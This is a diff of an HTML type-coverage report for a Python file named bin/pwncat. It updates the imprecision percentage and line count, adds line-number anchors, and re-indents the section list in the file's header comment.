@@ -14,13 +14,13 @@
 </tr></thead>
 <tfoot><tr class="summary summary-quality-1">
 <th class="summary summary-filename">Total</th>
-<th class="summary summary-precision">6.45% imprecise</th>
-<th class="summary summary-lines">3055 LOC</th>
+<th class="summary summary-precision">5.93% imprecise</th>
+<th class="summary summary-lines">3422 LOC</th>
 </tr></tfoot>
 <tbody><tr class="summary summary-quality-1">
 <td class="summary summary-filename">bin/pwncat</td>
-<td class="summary summary-precision">6.45% imprecise</td>
-<td class="summary summary-lines">3055 LOC</td>
+<td class="summary summary-precision">5.93% imprecise</td>
+<td class="summary summary-lines">3422 LOC</td>
 </tr></tbody>
 </table>
 </body>
@@ -3090,21 +3090,389 @@
 <span id="L3053" class="lineno"><a class="lineno" href="#L3053">3053</a></span>
 <span id="L3054" class="lineno"><a class="lineno" href="#L3054">3054</a></span>
 <span id="L3055" class="lineno"><a class="lineno" href="#L3055">3055</a></span>
+<span id="L3056" class="lineno"><a class="lineno" href="#L3056">3056</a></span>
+<span id="L3057" class="lineno"><a class="lineno" href="#L3057">3057</a></span>
+<span id="L3058" class="lineno"><a class="lineno" href="#L3058">3058</a></span>
+<span id="L3059" class="lineno"><a class="lineno" href="#L3059">3059</a></span>
+<span id="L3060" class="lineno"><a class="lineno" href="#L3060">3060</a></span>
+<span id="L3061" class="lineno"><a class="lineno" href="#L3061">3061</a></span>
+<span id="L3062" class="lineno"><a class="lineno" href="#L3062">3062</a></span>
+<span id="L3063" class="lineno"><a class="lineno" href="#L3063">3063</a></span>
+<span id="L3064" class="lineno"><a class="lineno" href="#L3064">3064</a></span>
+<span id="L3065" class="lineno"><a class="lineno" href="#L3065">3065</a></span>
+<span id="L3066" class="lineno"><a class="lineno" href="#L3066">3066</a></span>
+<span id="L3067" class="lineno"><a class="lineno" href="#L3067">3067</a></span>
+<span id="L3068" class="lineno"><a class="lineno" href="#L3068">3068</a></span>
+<span id="L3069" class="lineno"><a class="lineno" href="#L3069">3069</a></span>
+<span id="L3070" class="lineno"><a class="lineno" href="#L3070">3070</a></span>
+<span id="L3071" class="lineno"><a class="lineno" href="#L3071">3071</a></span>
+<span id="L3072" class="lineno"><a class="lineno" href="#L3072">3072</a></span>
+<span id="L3073" class="lineno"><a class="lineno" href="#L3073">3073</a></span>
+<span id="L3074" class="lineno"><a class="lineno" href="#L3074">3074</a></span>
+<span id="L3075" class="lineno"><a class="lineno" href="#L3075">3075</a></span>
+<span id="L3076" class="lineno"><a class="lineno" href="#L3076">3076</a></span>
+<span id="L3077" class="lineno"><a class="lineno" href="#L3077">3077</a></span>
+<span id="L3078" class="lineno"><a class="lineno" href="#L3078">3078</a></span>
+<span id="L3079" class="lineno"><a class="lineno" href="#L3079">3079</a></span>
+<span id="L3080" class="lineno"><a class="lineno" href="#L3080">3080</a></span>
+<span id="L3081" class="lineno"><a class="lineno" href="#L3081">3081</a></span>
+<span id="L3082" class="lineno"><a class="lineno" href="#L3082">3082</a></span>
+<span id="L3083" class="lineno"><a class="lineno" href="#L3083">3083</a></span>
+<span id="L3084" class="lineno"><a class="lineno" href="#L3084">3084</a></span>
+<span id="L3085" class="lineno"><a class="lineno" href="#L3085">3085</a></span>
+<span id="L3086" class="lineno"><a class="lineno" href="#L3086">3086</a></span>
+<span id="L3087" class="lineno"><a class="lineno" href="#L3087">3087</a></span>
+<span id="L3088" class="lineno"><a class="lineno" href="#L3088">3088</a></span>
+<span id="L3089" class="lineno"><a class="lineno" href="#L3089">3089</a></span>
+<span id="L3090" class="lineno"><a class="lineno" href="#L3090">3090</a></span>
+<span id="L3091" class="lineno"><a class="lineno" href="#L3091">3091</a></span>
+<span id="L3092" class="lineno"><a class="lineno" href="#L3092">3092</a></span>
+<span id="L3093" class="lineno"><a class="lineno" href="#L3093">3093</a></span>
+<span id="L3094" class="lineno"><a class="lineno" href="#L3094">3094</a></span>
+<span id="L3095" class="lineno"><a class="lineno" href="#L3095">3095</a></span>
+<span id="L3096" class="lineno"><a class="lineno" href="#L3096">3096</a></span>
+<span id="L3097" class="lineno"><a class="lineno" href="#L3097">3097</a></span>
+<span id="L3098" class="lineno"><a class="lineno" href="#L3098">3098</a></span>
+<span id="L3099" class="lineno"><a class="lineno" href="#L3099">3099</a></span>
+<span id="L3100" class="lineno"><a class="lineno" href="#L3100">3100</a></span>
+<span id="L3101" class="lineno"><a class="lineno" href="#L3101">3101</a></span>
+<span id="L3102" class="lineno"><a class="lineno" href="#L3102">3102</a></span>
+<span id="L3103" class="lineno"><a class="lineno" href="#L3103">3103</a></span>
+<span id="L3104" class="lineno"><a class="lineno" href="#L3104">3104</a></span>
+<span id="L3105" class="lineno"><a class="lineno" href="#L3105">3105</a></span>
+<span id="L3106" class="lineno"><a class="lineno" href="#L3106">3106</a></span>
+<span id="L3107" class="lineno"><a class="lineno" href="#L3107">3107</a></span>
+<span id="L3108" class="lineno"><a class="lineno" href="#L3108">3108</a></span>
+<span id="L3109" class="lineno"><a class="lineno" href="#L3109">3109</a></span>
+<span id="L3110" class="lineno"><a class="lineno" href="#L3110">3110</a></span>
+<span id="L3111" class="lineno"><a class="lineno" href="#L3111">3111</a></span>
+<span id="L3112" class="lineno"><a class="lineno" href="#L3112">3112</a></span>
+<span id="L3113" class="lineno"><a class="lineno" href="#L3113">3113</a></span>
+<span id="L3114" class="lineno"><a class="lineno" href="#L3114">3114</a></span>
+<span id="L3115" class="lineno"><a class="lineno" href="#L3115">3115</a></span>
+<span id="L3116" class="lineno"><a class="lineno" href="#L3116">3116</a></span>
+<span id="L3117" class="lineno"><a class="lineno" href="#L3117">3117</a></span>
+<span id="L3118" class="lineno"><a class="lineno" href="#L3118">3118</a></span>
+<span id="L3119" class="lineno"><a class="lineno" href="#L3119">3119</a></span>
+<span id="L3120" class="lineno"><a class="lineno" href="#L3120">3120</a></span>
+<span id="L3121" class="lineno"><a class="lineno" href="#L3121">3121</a></span>
+<span id="L3122" class="lineno"><a class="lineno" href="#L3122">3122</a></span>
+<span id="L3123" class="lineno"><a class="lineno" href="#L3123">3123</a></span>
+<span id="L3124" class="lineno"><a class="lineno" href="#L3124">3124</a></span>
+<span id="L3125" class="lineno"><a class="lineno" href="#L3125">3125</a></span>
+<span id="L3126" class="lineno"><a class="lineno" href="#L3126">3126</a></span>
+<span id="L3127" class="lineno"><a class="lineno" href="#L3127">3127</a></span>
+<span id="L3128" class="lineno"><a class="lineno" href="#L3128">3128</a></span>
+<span id="L3129" class="lineno"><a class="lineno" href="#L3129">3129</a></span>
+<span id="L3130" class="lineno"><a class="lineno" href="#L3130">3130</a></span>
+<span id="L3131" class="lineno"><a class="lineno" href="#L3131">3131</a></span>
+<span id="L3132" class="lineno"><a class="lineno" href="#L3132">3132</a></span>
+<span id="L3133" class="lineno"><a class="lineno" href="#L3133">3133</a></span>
+<span id="L3134" class="lineno"><a class="lineno" href="#L3134">3134</a></span>
+<span id="L3135" class="lineno"><a class="lineno" href="#L3135">3135</a></span>
+<span id="L3136" class="lineno"><a class="lineno" href="#L3136">3136</a></span>
+<span id="L3137" class="lineno"><a class="lineno" href="#L3137">3137</a></span>
+<span id="L3138" class="lineno"><a class="lineno" href="#L3138">3138</a></span>
+<span id="L3139" class="lineno"><a class="lineno" href="#L3139">3139</a></span>
+<span id="L3140" class="lineno"><a class="lineno" href="#L3140">3140</a></span>
+<span id="L3141" class="lineno"><a class="lineno" href="#L3141">3141</a></span>
+<span id="L3142" class="lineno"><a class="lineno" href="#L3142">3142</a></span>
+<span id="L3143" class="lineno"><a class="lineno" href="#L3143">3143</a></span>
+<span id="L3144" class="lineno"><a class="lineno" href="#L3144">3144</a></span>
+<span id="L3145" class="lineno"><a class="lineno" href="#L3145">3145</a></span>
+<span id="L3146" class="lineno"><a class="lineno" href="#L3146">3146</a></span>
+<span id="L3147" class="lineno"><a class="lineno" href="#L3147">3147</a></span>
+<span id="L3148" class="lineno"><a class="lineno" href="#L3148">3148</a></span>
+<span id="L3149" class="lineno"><a class="lineno" href="#L3149">3149</a></span>
+<span id="L3150" class="lineno"><a class="lineno" href="#L3150">3150</a></span>
+<span id="L3151" class="lineno"><a class="lineno" href="#L3151">3151</a></span>
+<span id="L3152" class="lineno"><a class="lineno" href="#L3152">3152</a></span>
+<span id="L3153" class="lineno"><a class="lineno" href="#L3153">3153</a></span>
+<span id="L3154" class="lineno"><a class="lineno" href="#L3154">3154</a></span>
+<span id="L3155" class="lineno"><a class="lineno" href="#L3155">3155</a></span>
+<span id="L3156" class="lineno"><a class="lineno" href="#L3156">3156</a></span>
+<span id="L3157" class="lineno"><a class="lineno" href="#L3157">3157</a></span>
+<span id="L3158" class="lineno"><a class="lineno" href="#L3158">3158</a></span>
+<span id="L3159" class="lineno"><a class="lineno" href="#L3159">3159</a></span>
+<span id="L3160" class="lineno"><a class="lineno" href="#L3160">3160</a></span>
+<span id="L3161" class="lineno"><a class="lineno" href="#L3161">3161</a></span>
+<span id="L3162" class="lineno"><a class="lineno" href="#L3162">3162</a></span>
+<span id="L3163" class="lineno"><a class="lineno" href="#L3163">3163</a></span>
+<span id="L3164" class="lineno"><a class="lineno" href="#L3164">3164</a></span>
+<span id="L3165" class="lineno"><a class="lineno" href="#L3165">3165</a></span>
+<span id="L3166" class="lineno"><a class="lineno" href="#L3166">3166</a></span>
+<span id="L3167" class="lineno"><a class="lineno" href="#L3167">3167</a></span>
+<span id="L3168" class="lineno"><a class="lineno" href="#L3168">3168</a></span>
+<span id="L3169" class="lineno"><a class="lineno" href="#L3169">3169</a></span>
+<span id="L3170" class="lineno"><a class="lineno" href="#L3170">3170</a></span>
+<span id="L3171" class="lineno"><a class="lineno" href="#L3171">3171</a></span>
+<span id="L3172" class="lineno"><a class="lineno" href="#L3172">3172</a></span>
+<span id="L3173" class="lineno"><a class="lineno" href="#L3173">3173</a></span>
+<span id="L3174" class="lineno"><a class="lineno" href="#L3174">3174</a></span>
+<span id="L3175" class="lineno"><a class="lineno" href="#L3175">3175</a></span>
+<span id="L3176" class="lineno"><a class="lineno" href="#L3176">3176</a></span>
+<span id="L3177" class="lineno"><a class="lineno" href="#L3177">3177</a></span>
+<span id="L3178" class="lineno"><a class="lineno" href="#L3178">3178</a></span>
+<span id="L3179" class="lineno"><a class="lineno" href="#L3179">3179</a></span>
+<span id="L3180" class="lineno"><a class="lineno" href="#L3180">3180</a></span>
+<span id="L3181" class="lineno"><a class="lineno" href="#L3181">3181</a></span>
+<span id="L3182" class="lineno"><a class="lineno" href="#L3182">3182</a></span>
+<span id="L3183" class="lineno"><a class="lineno" href="#L3183">3183</a></span>
+<span id="L3184" class="lineno"><a class="lineno" href="#L3184">3184</a></span>
+<span id="L3185" class="lineno"><a class="lineno" href="#L3185">3185</a></span>
+<span id="L3186" class="lineno"><a class="lineno" href="#L3186">3186</a></span>
+<span id="L3187" class="lineno"><a class="lineno" href="#L3187">3187</a></span>
+<span id="L3188" class="lineno"><a class="lineno" href="#L3188">3188</a></span>
+<span id="L3189" class="lineno"><a class="lineno" href="#L3189">3189</a></span>
+<span id="L3190" class="lineno"><a class="lineno" href="#L3190">3190</a></span>
+<span id="L3191" class="lineno"><a class="lineno" href="#L3191">3191</a></span>
+<span id="L3192" class="lineno"><a class="lineno" href="#L3192">3192</a></span>
+<span id="L3193" class="lineno"><a class="lineno" href="#L3193">3193</a></span>
+<span id="L3194" class="lineno"><a class="lineno" href="#L3194">3194</a></span>
+<span id="L3195" class="lineno"><a class="lineno" href="#L3195">3195</a></span>
+<span id="L3196" class="lineno"><a class="lineno" href="#L3196">3196</a></span>
+<span id="L3197" class="lineno"><a class="lineno" href="#L3197">3197</a></span>
+<span id="L3198" class="lineno"><a class="lineno" href="#L3198">3198</a></span>
+<span id="L3199" class="lineno"><a class="lineno" href="#L3199">3199</a></span>
+<span id="L3200" class="lineno"><a class="lineno" href="#L3200">3200</a></span>
+<span id="L3201" class="lineno"><a class="lineno" href="#L3201">3201</a></span>
+<span id="L3202" class="lineno"><a class="lineno" href="#L3202">3202</a></span>
+<span id="L3203" class="lineno"><a class="lineno" href="#L3203">3203</a></span>
+<span id="L3204" class="lineno"><a class="lineno" href="#L3204">3204</a></span>
+<span id="L3205" class="lineno"><a class="lineno" href="#L3205">3205</a></span>
+<span id="L3206" class="lineno"><a class="lineno" href="#L3206">3206</a></span>
+<span id="L3207" class="lineno"><a class="lineno" href="#L3207">3207</a></span>
+<span id="L3208" class="lineno"><a class="lineno" href="#L3208">3208</a></span>
+<span id="L3209" class="lineno"><a class="lineno" href="#L3209">3209</a></span>
+<span id="L3210" class="lineno"><a class="lineno" href="#L3210">3210</a></span>
+<span id="L3211" class="lineno"><a class="lineno" href="#L3211">3211</a></span>
+<span id="L3212" class="lineno"><a class="lineno" href="#L3212">3212</a></span>
+<span id="L3213" class="lineno"><a class="lineno" href="#L3213">3213</a></span>
+<span id="L3214" class="lineno"><a class="lineno" href="#L3214">3214</a></span>
+<span id="L3215" class="lineno"><a class="lineno" href="#L3215">3215</a></span>
+<span id="L3216" class="lineno"><a class="lineno" href="#L3216">3216</a></span>
+<span id="L3217" class="lineno"><a class="lineno" href="#L3217">3217</a></span>
+<span id="L3218" class="lineno"><a class="lineno" href="#L3218">3218</a></span>
+<span id="L3219" class="lineno"><a class="lineno" href="#L3219">3219</a></span>
+<span id="L3220" class="lineno"><a class="lineno" href="#L3220">3220</a></span>
+<span id="L3221" class="lineno"><a class="lineno" href="#L3221">3221</a></span>
+<span id="L3222" class="lineno"><a class="lineno" href="#L3222">3222</a></span>
+<span id="L3223" class="lineno"><a class="lineno" href="#L3223">3223</a></span>
+<span id="L3224" class="lineno"><a class="lineno" href="#L3224">3224</a></span>
+<span id="L3225" class="lineno"><a class="lineno" href="#L3225">3225</a></span>
+<span id="L3226" class="lineno"><a class="lineno" href="#L3226">3226</a></span>
+<span id="L3227" class="lineno"><a class="lineno" href="#L3227">3227</a></span>
+<span id="L3228" class="lineno"><a class="lineno" href="#L3228">3228</a></span>
+<span id="L3229" class="lineno"><a class="lineno" href="#L3229">3229</a></span>
+<span id="L3230" class="lineno"><a class="lineno" href="#L3230">3230</a></span>
+<span id="L3231" class="lineno"><a class="lineno" href="#L3231">3231</a></span>
+<span id="L3232" class="lineno"><a class="lineno" href="#L3232">3232</a></span>
+<span id="L3233" class="lineno"><a class="lineno" href="#L3233">3233</a></span>
+<span id="L3234" class="lineno"><a class="lineno" href="#L3234">3234</a></span>
+<span id="L3235" class="lineno"><a class="lineno" href="#L3235">3235</a></span>
+<span id="L3236" class="lineno"><a class="lineno" href="#L3236">3236</a></span>
+<span id="L3237" class="lineno"><a class="lineno" href="#L3237">3237</a></span>
+<span id="L3238" class="lineno"><a class="lineno" href="#L3238">3238</a></span>
+<span id="L3239" class="lineno"><a class="lineno" href="#L3239">3239</a></span>
+<span id="L3240" class="lineno"><a class="lineno" href="#L3240">3240</a></span>
+<span id="L3241" class="lineno"><a class="lineno" href="#L3241">3241</a></span>
+<span id="L3242" class="lineno"><a class="lineno" href="#L3242">3242</a></span>
+<span id="L3243" class="lineno"><a class="lineno" href="#L3243">3243</a></span>
+<span id="L3244" class="lineno"><a class="lineno" href="#L3244">3244</a></span>
+<span id="L3245" class="lineno"><a class="lineno" href="#L3245">3245</a></span>
+<span id="L3246" class="lineno"><a class="lineno" href="#L3246">3246</a></span>
+<span id="L3247" class="lineno"><a class="lineno" href="#L3247">3247</a></span>
+<span id="L3248" class="lineno"><a class="lineno" href="#L3248">3248</a></span>
+<span id="L3249" class="lineno"><a class="lineno" href="#L3249">3249</a></span>
+<span id="L3250" class="lineno"><a class="lineno" href="#L3250">3250</a></span>
+<span id="L3251" class="lineno"><a class="lineno" href="#L3251">3251</a></span>
+<span id="L3252" class="lineno"><a class="lineno" href="#L3252">3252</a></span>
+<span id="L3253" class="lineno"><a class="lineno" href="#L3253">3253</a></span>
+<span id="L3254" class="lineno"><a class="lineno" href="#L3254">3254</a></span>
+<span id="L3255" class="lineno"><a class="lineno" href="#L3255">3255</a></span>
+<span id="L3256" class="lineno"><a class="lineno" href="#L3256">3256</a></span>
+<span id="L3257" class="lineno"><a class="lineno" href="#L3257">3257</a></span>
+<span id="L3258" class="lineno"><a class="lineno" href="#L3258">3258</a></span>
+<span id="L3259" class="lineno"><a class="lineno" href="#L3259">3259</a></span>
+<span id="L3260" class="lineno"><a class="lineno" href="#L3260">3260</a></span>
+<span id="L3261" class="lineno"><a class="lineno" href="#L3261">3261</a></span>
+<span id="L3262" class="lineno"><a class="lineno" href="#L3262">3262</a></span>
+<span id="L3263" class="lineno"><a class="lineno" href="#L3263">3263</a></span>
+<span id="L3264" class="lineno"><a class="lineno" href="#L3264">3264</a></span>
+<span id="L3265" class="lineno"><a class="lineno" href="#L3265">3265</a></span>
+<span id="L3266" class="lineno"><a class="lineno" href="#L3266">3266</a></span>
+<span id="L3267" class="lineno"><a class="lineno" href="#L3267">3267</a></span>
+<span id="L3268" class="lineno"><a class="lineno" href="#L3268">3268</a></span>
+<span id="L3269" class="lineno"><a class="lineno" href="#L3269">3269</a></span>
+<span id="L3270" class="lineno"><a class="lineno" href="#L3270">3270</a></span>
+<span id="L3271" class="lineno"><a class="lineno" href="#L3271">3271</a></span>
+<span id="L3272" class="lineno"><a class="lineno" href="#L3272">3272</a></span>
+<span id="L3273" class="lineno"><a class="lineno" href="#L3273">3273</a></span>
+<span id="L3274" class="lineno"><a class="lineno" href="#L3274">3274</a></span>
+<span id="L3275" class="lineno"><a class="lineno" href="#L3275">3275</a></span>
+<span id="L3276" class="lineno"><a class="lineno" href="#L3276">3276</a></span>
+<span id="L3277" class="lineno"><a class="lineno" href="#L3277">3277</a></span>
+<span id="L3278" class="lineno"><a class="lineno" href="#L3278">3278</a></span>
+<span id="L3279" class="lineno"><a class="lineno" href="#L3279">3279</a></span>
+<span id="L3280" class="lineno"><a class="lineno" href="#L3280">3280</a></span>
+<span id="L3281" class="lineno"><a class="lineno" href="#L3281">3281</a></span>
+<span id="L3282" class="lineno"><a class="lineno" href="#L3282">3282</a></span>
+<span id="L3283" class="lineno"><a class="lineno" href="#L3283">3283</a></span>
+<span id="L3284" class="lineno"><a class="lineno" href="#L3284">3284</a></span>
+<span id="L3285" class="lineno"><a class="lineno" href="#L3285">3285</a></span>
+<span id="L3286" class="lineno"><a class="lineno" href="#L3286">3286</a></span>
+<span id="L3287" class="lineno"><a class="lineno" href="#L3287">3287</a></span>
+<span id="L3288" class="lineno"><a class="lineno" href="#L3288">3288</a></span>
+<span id="L3289" class="lineno"><a class="lineno" href="#L3289">3289</a></span>
+<span id="L3290" class="lineno"><a class="lineno" href="#L3290">3290</a></span>
+<span id="L3291" class="lineno"><a class="lineno" href="#L3291">3291</a></span>
+<span id="L3292" class="lineno"><a class="lineno" href="#L3292">3292</a></span>
+<span id="L3293" class="lineno"><a class="lineno" href="#L3293">3293</a></span>
+<span id="L3294" class="lineno"><a class="lineno" href="#L3294">3294</a></span>
+<span id="L3295" class="lineno"><a class="lineno" href="#L3295">3295</a></span>
+<span id="L3296" class="lineno"><a class="lineno" href="#L3296">3296</a></span>
+<span id="L3297" class="lineno"><a class="lineno" href="#L3297">3297</a></span>
+<span id="L3298" class="lineno"><a class="lineno" href="#L3298">3298</a></span>
+<span id="L3299" class="lineno"><a class="lineno" href="#L3299">3299</a></span>
+<span id="L3300" class="lineno"><a class="lineno" href="#L3300">3300</a></span>
+<span id="L3301" class="lineno"><a class="lineno" href="#L3301">3301</a></span>
+<span id="L3302" class="lineno"><a class="lineno" href="#L3302">3302</a></span>
+<span id="L3303" class="lineno"><a class="lineno" href="#L3303">3303</a></span>
+<span id="L3304" class="lineno"><a class="lineno" href="#L3304">3304</a></span>
+<span id="L3305" class="lineno"><a class="lineno" href="#L3305">3305</a></span>
+<span id="L3306" class="lineno"><a class="lineno" href="#L3306">3306</a></span>
+<span id="L3307" class="lineno"><a class="lineno" href="#L3307">3307</a></span>
+<span id="L3308" class="lineno"><a class="lineno" href="#L3308">3308</a></span>
+<span id="L3309" class="lineno"><a class="lineno" href="#L3309">3309</a></span>
+<span id="L3310" class="lineno"><a class="lineno" href="#L3310">3310</a></span>
+<span id="L3311" class="lineno"><a class="lineno" href="#L3311">3311</a></span>
+<span id="L3312" class="lineno"><a class="lineno" href="#L3312">3312</a></span>
+<span id="L3313" class="lineno"><a class="lineno" href="#L3313">3313</a></span>
+<span id="L3314" class="lineno"><a class="lineno" href="#L3314">3314</a></span>
+<span id="L3315" class="lineno"><a class="lineno" href="#L3315">3315</a></span>
+<span id="L3316" class="lineno"><a class="lineno" href="#L3316">3316</a></span>
+<span id="L3317" class="lineno"><a class="lineno" href="#L3317">3317</a></span>
+<span id="L3318" class="lineno"><a class="lineno" href="#L3318">3318</a></span>
+<span id="L3319" class="lineno"><a class="lineno" href="#L3319">3319</a></span>
+<span id="L3320" class="lineno"><a class="lineno" href="#L3320">3320</a></span>
+<span id="L3321" class="lineno"><a class="lineno" href="#L3321">3321</a></span>
+<span id="L3322" class="lineno"><a class="lineno" href="#L3322">3322</a></span>
+<span id="L3323" class="lineno"><a class="lineno" href="#L3323">3323</a></span>
+<span id="L3324" class="lineno"><a class="lineno" href="#L3324">3324</a></span>
+<span id="L3325" class="lineno"><a class="lineno" href="#L3325">3325</a></span>
+<span id="L3326" class="lineno"><a class="lineno" href="#L3326">3326</a></span>
+<span id="L3327" class="lineno"><a class="lineno" href="#L3327">3327</a></span>
+<span id="L3328" class="lineno"><a class="lineno" href="#L3328">3328</a></span>
+<span id="L3329" class="lineno"><a class="lineno" href="#L3329">3329</a></span>
+<span id="L3330" class="lineno"><a class="lineno" href="#L3330">3330</a></span>
+<span id="L3331" class="lineno"><a class="lineno" href="#L3331">3331</a></span>
+<span id="L3332" class="lineno"><a class="lineno" href="#L3332">3332</a></span>
+<span id="L3333" class="lineno"><a class="lineno" href="#L3333">3333</a></span>
+<span id="L3334" class="lineno"><a class="lineno" href="#L3334">3334</a></span>
+<span id="L3335" class="lineno"><a class="lineno" href="#L3335">3335</a></span>
+<span id="L3336" class="lineno"><a class="lineno" href="#L3336">3336</a></span>
+<span id="L3337" class="lineno"><a class="lineno" href="#L3337">3337</a></span>
+<span id="L3338" class="lineno"><a class="lineno" href="#L3338">3338</a></span>
+<span id="L3339" class="lineno"><a class="lineno" href="#L3339">3339</a></span>
+<span id="L3340" class="lineno"><a class="lineno" href="#L3340">3340</a></span>
+<span id="L3341" class="lineno"><a class="lineno" href="#L3341">3341</a></span>
+<span id="L3342" class="lineno"><a class="lineno" href="#L3342">3342</a></span>
+<span id="L3343" class="lineno"><a class="lineno" href="#L3343">3343</a></span>
+<span id="L3344" class="lineno"><a class="lineno" href="#L3344">3344</a></span>
+<span id="L3345" class="lineno"><a class="lineno" href="#L3345">3345</a></span>
+<span id="L3346" class="lineno"><a class="lineno" href="#L3346">3346</a></span>
+<span id="L3347" class="lineno"><a class="lineno" href="#L3347">3347</a></span>
+<span id="L3348" class="lineno"><a class="lineno" href="#L3348">3348</a></span>
+<span id="L3349" class="lineno"><a class="lineno" href="#L3349">3349</a></span>
+<span id="L3350" class="lineno"><a class="lineno" href="#L3350">3350</a></span>
+<span id="L3351" class="lineno"><a class="lineno" href="#L3351">3351</a></span>
+<span id="L3352" class="lineno"><a class="lineno" href="#L3352">3352</a></span>
+<span id="L3353" class="lineno"><a class="lineno" href="#L3353">3353</a></span>
+<span id="L3354" class="lineno"><a class="lineno" href="#L3354">3354</a></span>
+<span id="L3355" class="lineno"><a class="lineno" href="#L3355">3355</a></span>
+<span id="L3356" class="lineno"><a class="lineno" href="#L3356">3356</a></span>
+<span id="L3357" class="lineno"><a class="lineno" href="#L3357">3357</a></span>
+<span id="L3358" class="lineno"><a class="lineno" href="#L3358">3358</a></span>
+<span id="L3359" class="lineno"><a class="lineno" href="#L3359">3359</a></span>
+<span id="L3360" class="lineno"><a class="lineno" href="#L3360">3360</a></span>
+<span id="L3361" class="lineno"><a class="lineno" href="#L3361">3361</a></span>
+<span id="L3362" class="lineno"><a class="lineno" href="#L3362">3362</a></span>
+<span id="L3363" class="lineno"><a class="lineno" href="#L3363">3363</a></span>
+<span id="L3364" class="lineno"><a class="lineno" href="#L3364">3364</a></span>
+<span id="L3365" class="lineno"><a class="lineno" href="#L3365">3365</a></span>
+<span id="L3366" class="lineno"><a class="lineno" href="#L3366">3366</a></span>
+<span id="L3367" class="lineno"><a class="lineno" href="#L3367">3367</a></span>
+<span id="L3368" class="lineno"><a class="lineno" href="#L3368">3368</a></span>
+<span id="L3369" class="lineno"><a class="lineno" href="#L3369">3369</a></span>
+<span id="L3370" class="lineno"><a class="lineno" href="#L3370">3370</a></span>
+<span id="L3371" class="lineno"><a class="lineno" href="#L3371">3371</a></span>
+<span id="L3372" class="lineno"><a class="lineno" href="#L3372">3372</a></span>
+<span id="L3373" class="lineno"><a class="lineno" href="#L3373">3373</a></span>
+<span id="L3374" class="lineno"><a class="lineno" href="#L3374">3374</a></span>
+<span id="L3375" class="lineno"><a class="lineno" href="#L3375">3375</a></span>
+<span id="L3376" class="lineno"><a class="lineno" href="#L3376">3376</a></span>
+<span id="L3377" class="lineno"><a class="lineno" href="#L3377">3377</a></span>
+<span id="L3378" class="lineno"><a class="lineno" href="#L3378">3378</a></span>
+<span id="L3379" class="lineno"><a class="lineno" href="#L3379">3379</a></span>
+<span id="L3380" class="lineno"><a class="lineno" href="#L3380">3380</a></span>
+<span id="L3381" class="lineno"><a class="lineno" href="#L3381">3381</a></span>
+<span id="L3382" class="lineno"><a class="lineno" href="#L3382">3382</a></span>
+<span id="L3383" class="lineno"><a class="lineno" href="#L3383">3383</a></span>
+<span id="L3384" class="lineno"><a class="lineno" href="#L3384">3384</a></span>
+<span id="L3385" class="lineno"><a class="lineno" href="#L3385">3385</a></span>
+<span id="L3386" class="lineno"><a class="lineno" href="#L3386">3386</a></span>
+<span id="L3387" class="lineno"><a class="lineno" href="#L3387">3387</a></span>
+<span id="L3388" class="lineno"><a class="lineno" href="#L3388">3388</a></span>
+<span id="L3389" class="lineno"><a class="lineno" href="#L3389">3389</a></span>
+<span id="L3390" class="lineno"><a class="lineno" href="#L3390">3390</a></span>
+<span id="L3391" class="lineno"><a class="lineno" href="#L3391">3391</a></span>
+<span id="L3392" class="lineno"><a class="lineno" href="#L3392">3392</a></span>
+<span id="L3393" class="lineno"><a class="lineno" href="#L3393">3393</a></span>
+<span id="L3394" class="lineno"><a class="lineno" href="#L3394">3394</a></span>
+<span id="L3395" class="lineno"><a class="lineno" href="#L3395">3395</a></span>
+<span id="L3396" class="lineno"><a class="lineno" href="#L3396">3396</a></span>
+<span id="L3397" class="lineno"><a class="lineno" href="#L3397">3397</a></span>
+<span id="L3398" class="lineno"><a class="lineno" href="#L3398">3398</a></span>
+<span id="L3399" class="lineno"><a class="lineno" href="#L3399">3399</a></span>
+<span id="L3400" class="lineno"><a class="lineno" href="#L3400">3400</a></span>
+<span id="L3401" class="lineno"><a class="lineno" href="#L3401">3401</a></span>
+<span id="L3402" class="lineno"><a class="lineno" href="#L3402">3402</a></span>
+<span id="L3403" class="lineno"><a class="lineno" href="#L3403">3403</a></span>
+<span id="L3404" class="lineno"><a class="lineno" href="#L3404">3404</a></span>
+<span id="L3405" class="lineno"><a class="lineno" href="#L3405">3405</a></span>
+<span id="L3406" class="lineno"><a class="lineno" href="#L3406">3406</a></span>
+<span id="L3407" class="lineno"><a class="lineno" href="#L3407">3407</a></span>
+<span id="L3408" class="lineno"><a class="lineno" href="#L3408">3408</a></span>
+<span id="L3409" class="lineno"><a class="lineno" href="#L3409">3409</a></span>
+<span id="L3410" class="lineno"><a class="lineno" href="#L3410">3410</a></span>
+<span id="L3411" class="lineno"><a class="lineno" href="#L3411">3411</a></span>
+<span id="L3412" class="lineno"><a class="lineno" href="#L3412">3412</a></span>
+<span id="L3413" class="lineno"><a class="lineno" href="#L3413">3413</a></span>
+<span id="L3414" class="lineno"><a class="lineno" href="#L3414">3414</a></span>
+<span id="L3415" class="lineno"><a class="lineno" href="#L3415">3415</a></span>
+<span id="L3416" class="lineno"><a class="lineno" href="#L3416">3416</a></span>
+<span id="L3417" class="lineno"><a class="lineno" href="#L3417">3417</a></span>
+<span id="L3418" class="lineno"><a class="lineno" href="#L3418">3418</a></span>
+<span id="L3419" class="lineno"><a class="lineno" href="#L3419">3419</a></span>
+<span id="L3420" class="lineno"><a class="lineno" href="#L3420">3420</a></span>
+<span id="L3421" class="lineno"><a class="lineno" href="#L3421">3421</a></span>
+<span id="L3422" class="lineno"><a class="lineno" href="#L3422">3422</a></span>
 </pre></td>
 <td class="table-code"><pre><span class="line-empty" title="No Anys on this line!">#!/usr/bin/env python3</span>
 <span class="line-empty" title="No Anys on this line!">"""pwncat."""</span>
 <span class="line-empty" title="No Anys on this line!"></span>
 <span class="line-empty" title="No Anys on this line!"># Main sections in this file:</span>
 <span class="line-empty" title="No Anys on this line!"># ------------------------------------</span>
-<span class="line-empty" title="No Anys on this line!"># 1. Data structure types</span>
-<span class="line-empty" title="No Anys on this line!"># 2. Library classes</span>
-<span class="line-empty" title="No Anys on this line!"># 3. Network</span>
-<span class="line-empty" title="No Anys on this line!"># 4. Transformer</span>
-<span class="line-empty" title="No Anys on this line!"># 5. IO modules</span>
-<span class="line-empty" title="No Anys on this line!"># 6. PSE Store</span>
-<span class="line-empty" title="No Anys on this line!"># 7. IO Runner</span>
-<span class="line-empty" title="No Anys on this line!"># 8. Command line arguments</span>
-<span class="line-empty" title="No Anys on this line!"># 9. Main entrypoint</span>
+<span class="line-empty" title="No Anys on this line!">#  1. Data structure types</span>
+<span class="line-empty" title="No Anys on this line!">#  2. Library classes</span>
+<span class="line-empty" title="No Anys on this line!">#  3. Network</span>
